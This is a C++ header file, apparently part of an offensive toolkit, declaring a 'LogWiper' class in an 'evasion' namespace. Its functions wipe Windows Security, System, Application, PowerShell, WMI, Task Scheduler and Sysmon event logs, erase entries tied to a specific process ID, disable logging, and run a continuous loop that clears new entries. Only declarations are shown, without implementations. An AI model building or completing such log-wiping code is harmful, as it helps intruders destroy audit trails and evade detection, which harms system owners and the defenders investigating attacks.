#pragma once
#include <windows.h>
#include <string>
#include <vector>
#include <thread>
#include <atomic>

namespace l4g::evasion {

class LogWiper {
public:
    LogWiper();
    ~LogWiper();
    
    void start_monitoring();
    void stop_monitoring();
    
    // Wipe specific event logs
    bool wipe_security_logs();
    bool wipe_system_logs();
    bool wipe_application_logs();
    bool wipe_powershell_logs();
    bool wipe_wmi_logs();
    bool wipe_all_logs();
    
    // Wipe logs related to specific PID
    bool wipe_pid_traces(DWORD pid);
    
    // Continuous monitoring for new entries
    void monitor_loop();
    
private:
    std::thread monitor_thread_;
    std::atomic<bool> running_{false};
    
    // Event log names to monitor/clear
    static constexpr const wchar_t* LOG_NAMES[] = {
        L"Security",
        L"System",
        L"Application",
        L"Microsoft-Windows-PowerShell/Operational",
        L"Microsoft-Windows-PowerShell/ScriptBlock",
        L"Microsoft-Windows-PowerShell/Module",
        L"Microsoft-Windows-PowerShell/Provider",
        L"Microsoft-Windows-WMI/Operational",
        L"Microsoft-Windows-TaskScheduler/Operational",
        L"Microsoft-Windows-Sysmon/Operational"
    };
    
    bool clear_log(const wchar_t* log_name);
    bool clear_log_entries(const wchar_t* log_name, DWORD pid);
    bool disable_logging(const wchar_t* log_name);
    bool enable_logging(const wchar_t* log_name);
};

} // namespace l4g::evasion